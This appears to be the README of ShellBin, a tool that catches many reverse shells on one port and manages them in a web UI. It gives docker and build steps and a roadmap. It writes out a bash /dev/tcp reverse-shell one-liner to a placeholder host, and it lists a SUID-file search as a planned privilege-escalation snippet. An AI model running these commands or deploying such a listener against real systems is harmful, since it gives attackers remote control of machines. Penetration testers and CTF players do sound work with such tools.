# ShellBin

[中文文档](README_zh.md)

Elegantly receive reverse shell.

Receive multiple reverse shells on one port, and manage them in a web UI.

With the usage of [xterm.js](https://xtermjs.org/), complex commands like vi, tmux and Ctrl-C works ( you may need to gain pty, and set correct stty size. )

![screenshot](images/screenshot.png)

## Running

Recommended to use the [docker image from dockerhub](https://hub.docker.com/repository/docker/cwithw/shellbin).

```bash
docker run -d --name shellbin -p 9998:3000 -p 9999:3001 -e USERNAME=root -e PASSWORD=toor cwithw/shellbin:latest
```

Change the value of `USERNAME` and `PASSWORD` to your own username and password. 
You may also change `9998`(web UI port) and `9999`(reverse shell port) to your own port.

then visit `http://your-ip:9998` to see the web UI.

receive reverse shells on port 9999 (`bash -i >& /dev/tcp/your-ip/9999 0>&1`).

## development

```
make backend-environment
make frontend-environment
```

## build docker

```
make docker
```
```
make build-docker-image
```

## security & performance

This app is in prototype stage, it is generally secure, but not performant optimized, and the UI is not pretty,

pull requests are welcome.

## Roadmap

- [x] web UI with list of connected shells and using [xterm.js](https://xtermjs.org/) to display colored shell
- [x] authentication required for web UI
- [x] receive reverse shell
- [x] automatically remove dead connections
- [ ] fancy web UI
- [ ] resize terminal and send terminal event (currently you need to do `stty` command)
- [ ] snippets ( eg. `find / -perm 4000 2>/dev/null` )
- [ ] API for reverse shell